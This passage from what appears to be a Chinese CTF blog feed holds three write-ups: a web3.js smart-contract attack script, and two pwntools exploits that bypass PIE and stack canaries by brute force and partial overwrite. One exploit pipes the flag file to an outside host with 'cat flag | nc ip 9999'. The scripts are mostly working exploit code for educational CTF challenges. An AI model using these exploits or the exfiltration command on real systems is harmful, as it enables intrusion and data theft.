   chainId: <span class="hljs-number">3</span>,</span><br><span class="line">    gas: web3.utils.toHex(<span class="hljs-number">2500000</span>),</span><br><span class="line">    gasLimit: web3.utils.toHex(<span class="hljs-number">1554770</span>),</span><br><span class="line">    gasPrice: web3.utils.toHex(<span class="hljs-number">2003</span>), <span class="hljs-comment">// 10 Gwei</span></span><br><span class="line">    to: contractAddress,</span><br><span class="line">    <span class="hljs-keyword">from</span>: fromAddress,</span><br><span class="line">    value: <span class="hljs-string">"0x0"</span>, <span class="hljs-comment">//web3.utils.toHex(web3.utils.toWei(0, 'wei')),</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> EOSGameContract = <span class="hljs-keyword">new</span> web3.eth.Contract(abi, contractAddress);</span><br><span class="line"><span class="hljs-keyword">let</span> myattack = EOSGameContract.methods.myattack().encodeABI();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EOSGameContract.methods.getbet_count().call(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"bet_count result: "</span> + result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toattack</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    cango = <span class="hljs-literal">false</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> temp = txData;</span><br><span class="line">    temp[<span class="hljs-string">'data'</span>] = myattack;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(temp);</span><br><span class="line">    sendSigned(temp);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setInterval(<span class="hljs-function"><span class="hljs-params">nonce</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n========================================"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> (cango) &#123;</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"going...."</span>);</span><br><span class="line">        EOSGameContract.methods.getmyblance().call(&#123;</span><br><span class="line">            <span class="hljs-keyword">from</span>: fromAddress</span><br><span class="line">        &#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="hljs-keyword">throw</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"eosBlanceOf result: "</span> + result)</span><br><span class="line">        &#125;)</span><br><span class="line">        toattack();</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"can't going...."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="hljs-number">20000</span>);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;多次几次后可以成功：</p><div align="center"><br>    <img src="/images/posts/other/37.png"><br></div><p>&emsp;&emsp;接着再调用下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">togetflag</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">let</span> temp = txData;</span><br><span class="line">    temp[<span class="hljs-string">'data'</span>] = ctf;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(temp);</span><br><span class="line">    sendSigned(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">togetflag();</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;最终可以在交易块的<code>data</code>中拿到event的输出：</p><div align="center"><br>    <img src="/images/posts/other/38.png"><br></div><br><div align="center"><br>    <img src="/images/posts/other/39.png"><br></div><p>&emsp;&emsp;当然在合约的<code>events</code>上也可以看到：</p><div align="center"><br>    <img src="/images/posts/other/40.png"><br></div><p>&emsp;&emsp;最终的flag会发送到你的邮箱：</p><div align="center"><br>    <img src="/images/posts/other/41.png"><br></div><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BCTF&#123;y0u_c4n_PlAy_r34L_e0S_D0t_w1n_n0W&#125;</span><br></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>&emsp;&emsp;<a href="https://www.cnblogs.com/huahuayu/p/8670223.html" target="_blank">合约调用合约</a><br>&emsp;&emsp;<a href="https://github.com/ethereum/web3.js/issues/1763" target="_blank">web3js无法发送交易问题</a><br>&emsp;&emsp;<a href="http://mikemcl.github.io/bignumber.js" target="_blank">bignumber计算</a><br>&emsp;&emsp;<a href="https://web3js.readthedocs.io/" target="_blank">web3js api doc</a><br>&emsp;&emsp;<a href="https://gist.github.com/minhtt159/ca49522d73623f16feecd6be5bb544d4#file-eosattack-js" target="_blank">一个writeup</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;在写这个&lt;code&gt;study&lt;/code&gt;的时候我的&lt;code&gt;exp&lt;/code&gt;还在跑，&lt;code&gt;flag&lt;/code&gt;还未拿到，但不管结果如何，我都将记录下在这过程中学习到的东西。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="blockchain" scheme="http://yoursite.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>bypass pie use partial overwrite2 and libcdatabase</title>
    <link href="http://yoursite.com/2018/11/bypass-pie-and-libcdatabase/"/>
    <id>http://yoursite.com/2018/11/bypass-pie-and-libcdatabase/</id>
    <published>2018-11-27T13:00:56.000Z</published>
    <updated>2018-11-27T13:14:14.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇继续学习<code>PIE bypass</code>和通过<code>libcdatabase</code>查找libc库。<br><a id="more"></a></p><h3 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h3><p>&emsp;&emsp;在上一篇文章中采用了爆破程序中的某个函数(如send)的地址，通过判断是否有信息返回作为判断依据，但这个前提是使用了<code>fork</code>进程，因为这样每次的地址才不会变。</p><p>&emsp;&emsp;而在这个例子中，服务端并没有采用<code>fork</code>，我们每次请求的地址都不一样，所以就不能像上一道题的爆破做法。先看看程序代码：</p><div align="center"><br>    <img src="/images/posts/pwn/20.png"><br></div><br>&emsp;&emsp;漏洞产生在<code>read_msg(0, &amp;s, 128, 10)</code>，前面的<code>read_msg</code>并不会溢出。<br><br>&emsp;&emsp;<code>checksec</code>如下：<br><div align="center"><br>    <img src="/images/posts/pwn/21.png"><br></div><p>&emsp;&emsp;<code>canary</code>是没开的。这里采用的手法也跟前面相似，还是要利用<code>partial overwrite</code>，是程序产生<code>crash</code>，然后我们从输出的数据中发现有价值的信息。一样的因为<code>pie</code>的原因，我们只能操作最低一个字节，可以先写个程序爆破一波，并观察<code>crash</code>。脚本：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):</span><br><span class="line">        p = process(<span class="hljs-string">'./pieagain'</span>)</span><br><span class="line">        <span class="hljs-comment"># p = remote(ip, 10008)</span></span><br><span class="line">        p.recvline()</span><br><span class="line">        payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        </span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="hljs-comment"># pause()</span></span><br><span class="line">        payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">11</span> + chr(a)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            p.recvline()</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">"======================ok------------"</span> + hex(a)</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;然后可能在几个地方得到<code>crash</code>，然后对这些产生地方的地址进行筛选，挑选合适的点。这里我得到了<code>\x83</code>、<code>\xde</code>等等。。。</p><p>&emsp;&emsp;接着对<code>crash</code>出来的数据进行分析：</p><div align="center"><br>    <img src="/images/posts/pwn/22.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/23.png"><br></div><br>&emsp;&emsp;可以看到这里泄露了<code>libc</code>的地址，但不是基地址，离基地址有这<code>0xf76f3000 - 0xf7541000 = 0x1b2000</code>，而这个差距每次都是固定的，通过<code>readelf -S</code>可以看到这是<code>.got.plt</code>偏移地址。<br><div align="center"><br>    <img src="/images/posts/pwn/24.png"><br></div><blockquote><p>这里是我本地的偏移地址，我们再打远程时<code>一定</code>要换成远程libc的偏移地址。</p></blockquote><p>&emsp;&emsp;有了libc基地址后就可以写exp了：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="hljs-string">'192.168.10.11'</span></span><br><span class="line"><span class="hljs-comment"># p = remote(ip, 10008)</span></span><br><span class="line">p = process(<span class="hljs-string">'./pieagain'</span>)</span><br><span class="line">pelf = ELF(<span class="hljs-string">'./pieagain'</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">'./libc.so.local'</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">11</span> + <span class="hljs-string">'\xde'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">data = p.recv()</span><br><span class="line">libc_base_addr = u32(<span class="hljs-string">'\x00'</span>+data[<span class="hljs-number">9</span>:<span class="hljs-number">12</span>]) - <span class="hljs-number">0x1b2000</span></span><br><span class="line">log.debug(<span class="hljs-string">"libc_base_addr =======&gt; "</span> + hex(libc_base_addr))</span><br><span class="line"><span class="hljs-comment"># 细心的大佬发现这里是code base...</span></span><br><span class="line"><span class="hljs-comment"># program_start = u32(data[100:100+4]) &amp; 0xfffff000</span></span><br><span class="line"><span class="hljs-comment"># log.info("program start addr: " + hex(program_start))</span></span><br><span class="line"></span><br><span class="line">libc.address = libc_base_addr</span><br><span class="line">system_addr = libc.symbols[<span class="hljs-string">'system'</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"system_addr: "</span> + hex(system_addr))</span><br><span class="line">binsh = next(libc.search(<span class="hljs-string">'/bin/sh'</span>))</span><br><span class="line">log.debug(<span class="hljs-string">"binsh_addr: "</span> + hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">'B'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">11</span> + p32(system_addr) + p32(system_addr) + p32(binsh)</span><br><span class="line">pause()</span><br><span class="line">log.debug(<span class="hljs-string">"ready to call system..."</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-comment"># 看上面的</span></span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fuzz()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h3><p>&emsp;&emsp;但我们没有libc时我们可以通过泄露两个<code>libc</code>函数的地址，然后取最后三位，因为基址的后三位为0，然后取<code>libcdatabase</code>查询，<a href="https://libc.blukat.me" target="_blank">可以点击这里</a>。</p><div align="center"><br>    <img src="/images/posts/pwn/25.png"><br></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这篇继续学习&lt;code&gt;PIE bypass&lt;/code&gt;和通过&lt;code&gt;libcdatabase&lt;/code&gt;查找libc库。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="bypass pie" scheme="http://yoursite.com/tags/bypass-pie/"/>
    
  </entry>
  
  <entry>
    <title>bypass pie use partial overwrite and dup2</title>
    <link href="http://yoursite.com/2018/11/pie-bypass-overwrite-dup2/"/>
    <id>http://yoursite.com/2018/11/pie-bypass-overwrite-dup2/</id>
    <published>2018-11-23T08:47:56.000Z</published>
    <updated>2018-11-27T12:35:55.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇文章记录如何使用<code>partial overwrite</code>绕过<code>pie</code>和使用<code>dup2</code>重定向输入输出流到<code>socket</code>。<br><a id="more"></a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>&emsp;&emsp;简单描述下题目的环境，首先服务端使用<code>fork</code>进程来为每个用户建立<code>socket</code>来进行通信，主要逻辑如下：</p><div align="center"><br>    <img src="/images/posts/pwn/13.png"><br></div><p>&emsp;&emsp;其中在<code>read_msg</code>使用socket的<code>recv</code>接收用户输入，同时漏洞也产生在这。</p><p>&emsp;&emsp;由于是<code>fork</code>，所以fork得到进程有<code>父进程</code>一样的存储数据，如果开启了<code>canary</code>，那么每次socket连接得到的进程的<code>canary cookie</code>都是跟父进程一样的，这也是我们爆破的<code>前提</code>。</p><p>&emsp;&emsp;接下来<code>checksec</code>binary，查看程序开启的保护，得到：</p><ul><li>Arch:     i386-32-little</li><li>RELRO:    Partial RELRO</li><li>Stack:    Canary found</li><li>NX:       NX enabled</li><li>PIE:      PIE enabled</li></ul><p>&emsp;&emsp;如上，程序把基本的保护都开了。</p><p>&emsp;&emsp;在简单的栈溢出中，我们的直接目的就是覆盖函数的返回地址从而达到控制程序执行流的目的，而canary防护就是在返回地址的<code>前面</code>，加上一串随机的字符，每次程序<code>ret</code>时，对这串字符进行检查，如果这个值跟系统记录的值有所差异，系统就会终止程序执行，达到保护的作用。用gdb调试时可以发现：</p><div align="center"><br>    <img src="/images/posts/pwn/14.png"><br></div><p>&emsp;&emsp;如图，1是canary cookie的位置，而2是要覆盖的返回地址的位置。从图中可以知道要覆盖到2，必然会先覆盖1，所以，如果我们无法得到1的值，那么就算覆盖了2位置，程序在返回时检查<code>cookie</code>也会失败，然后停止执行，最终exp失败。</p><p>&emsp;&emsp;前面说过，fork出来的进程内存数据是跟父进程一样的，那么对于<code>canary</code>我们可以通过<code>爆破</code>的方式找到，并且由于cookie（通常为0xXXXXXX00）的<code>最低一个字节</code>为<code>0</code>，我们其实只要爆破3个字节就行。</p><p>&emsp;&emsp;然后再解释一下<code>ASLR</code>跟<code>PIE</code>的关系与区别：</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>&emsp;&emsp;ASLR有三级，分别为:</p><ul><li>0: 关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同</li><li>1: 普通的ASLR。mmap基地址、栈（stack）基地址、.so加载基地址都将被随机化，但是堆没用随机化</li><li>2: 增强的ASLR，增加了堆随机化</li></ul><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>&emsp;&emsp;而PIE是对<code>代码段、数据段</code>进行地址随机化，但是最终决定是否随机化的靠看<code>ASLR</code>，如果ASLR是关闭的，那么就算开启了PIE<code>也不会</code>进行地址随机化。</p><p>&emsp;&emsp;开启了PIE后，在IDA里看到的就是<code>偏移地址</code>，真实地址需要<code>code base address + offset</code>得到。</p><div align="center"><br>    <img src="/images/posts/pwn/15.png"><br></div><p>&emsp;&emsp;对于<code>pie</code>的绕过目前有<code>partial overwrite</code>的方法，因为<code>code base address</code>的<code>低12bit</code>都是<code>0</code>，如图：</p><div align="center"><br>    <img src="/images/posts/pwn/16.png"><br></div><p>&emsp;&emsp;所以我们可以通过控制<code>最低一个字节</code>来控制程序的执行流，然后找到可以作为参考的点，进行<code>爆破</code>判断，原理上类似于爆破canary cookie。</p><div align="center"><br>    <img src="/images/posts/pwn/17.png"><br></div><br>&emsp;&emsp;在这道题中，在原来本该返回的地址下方有一个给用户(客户端)<code>send</code>消息的函数，那么我们就可以利用这个地址作为我们爆破的点。我们以服务端是否有<code>消息发送</code>过来作为爆破成功的依据。<br><br>&emsp;&emsp;我们知道<code>send_client</code>函数（0x00001177）的最低一个字节是<code>\x77</code>，因为代码段基地址在上面中我们可以看到是<code>0x56561000</code>，所以不管怎么加，它的真实地址的<code>最低一个字节</code>都是<code>\x77</code>。当我们猜中它的地址时它就会发送一些奇怪的东西，因为它调用时栈还是乱七八槽的，但确实能得到数据，如我这里得到的<code>\xb0\x1d\x1b</code>，那我每次都以这个为准。<br><br>&emsp;&emsp;最终exp可以写成：<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># ip = '192.168.210.11'</span></span><br><span class="line">ip = <span class="hljs-string">'127.0.0.1'</span></span><br><span class="line"><span class="hljs-comment"># 'a' * 64 + p32(canary) + 'a' * 12 + p32(ret_addr)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    canary = <span class="hljs-string">"\x00"</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> j == <span class="hljs-number">10</span>:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">            <span class="hljs-keyword">print</span> p.recvline()</span><br><span class="line">            temp = canary + chr(j)</span><br><span class="line">            payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">4</span> * <span class="hljs-number">4</span> + temp</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">'See you again!\n'</span>)</span><br><span class="line">                canary = temp</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">            <span class="hljs-keyword">except</span>:</span><br><span class="line">                <span class="hljs-keyword">pass</span></span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"[***] found canary : "</span> + canary</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fuzz()</span></span><br><span class="line"></span><br><span class="line">canary = <span class="hljs-number">0x1b617500</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz_send_client</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    code_base = <span class="hljs-string">"\x77"</span></span><br><span class="line">    ok = <span class="hljs-keyword">False</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> j == <span class="hljs-number">10</span>:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">            <span class="hljs-keyword">print</span> p.recvline()</span><br><span class="line">            temp = code_base + chr(j)</span><br><span class="line">            payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + temp</span><br><span class="line">            <span class="hljs-keyword">if</span> j == <span class="hljs-number">145</span>:</span><br><span class="line">                pause()</span><br><span class="line">                p.sendline(payload)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">'\xb0\x1d\x1b'</span>)</span><br><span class="line">                code_base = temp</span><br><span class="line">                ok = <span class="hljs-keyword">True</span></span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">            <span class="hljs-keyword">except</span>:</span><br><span class="line">                <span class="hljs-keyword">pass</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">"[!!!] Oops!!!"</span></span><br><span class="line">            exit(<span class="hljs-number">-1</span>)</span><br><span class="line">    code_base = hex(u32(code_base) - <span class="hljs-number">0x1177</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"[***] found code_base : "</span> + code_base</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fuzz_send_client()</span></span><br><span class="line"></span><br><span class="line">code_base = <span class="hljs-number">0x5655e000</span></span><br><span class="line"></span><br><span class="line">pelf = ELF(<span class="hljs-string">'./pie'</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">'./libc.so.local'</span>)</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">main_addr = code_base + <span class="hljs-number">0x00000F3C</span></span><br><span class="line">send_addr = code_base + <span class="hljs-number">0x00000E8C</span></span><br><span class="line">libc_start_main = code_base + pelf.got[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(send_addr) + p32(main_addr) + p32(<span class="hljs-number">4</span>) + p32(libc_start_main) + p32(<span class="hljs-number">16</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u32(p.recv()[:<span class="hljs-number">4</span>])</span><br><span class="line">p.close()</span><br><span class="line">log.debug(<span class="hljs-string">"libc_start_main: "</span> + hex(libc_start_main))</span><br><span class="line"></span><br><span class="line">libc_base_addr = libc_start_main - libc.symbols[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"libc_base_addr: "</span> + hex(libc_base_addr))</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="hljs-string">"system"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"system_addr: "</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">bss_addr = code_base + <span class="hljs-number">0x00003084</span></span><br><span class="line">recv_addr = code_base + <span class="hljs-number">0x00000DDA</span></span><br><span class="line">shellcode = <span class="hljs-string">"cat flag | nc ip 9999"</span></span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to write bss..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(recv_addr) + p32(system_addr) + p32(<span class="hljs-number">4</span>) + p32(bss_addr) + p32(len(shellcode)) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to write shelloce..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># log.debug("call system...")</span></span><br><span class="line"><span class="hljs-comment"># pause()</span></span><br><span class="line"><span class="hljs-comment"># p = remote(ip, 10007)</span></span><br><span class="line"><span 